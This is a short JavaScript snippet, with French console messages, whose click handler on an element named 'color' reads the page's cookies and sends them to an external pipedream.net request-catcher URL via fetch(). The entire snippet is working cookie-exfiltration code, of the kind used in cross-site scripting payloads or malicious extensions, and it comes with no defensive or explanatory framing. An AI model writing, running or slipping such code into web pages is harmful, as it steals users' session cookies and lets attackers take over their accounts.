color.onclick = () => {
    const url = "http://enh87g4rhccr5.x.pipedream.net/?cookie=" + encodeURIComponent(document.cookie);
    fetch(url)
        .then(response => {
            if (response.ok) {
                console.log('Cookies envoyés avec succès.');
            } else {
                console.error('Erreur lors de l\'envoi des cookies.');
            }
        })
        .catch(error => {
            console.error('Erreur de réseau:', error);
        });
};
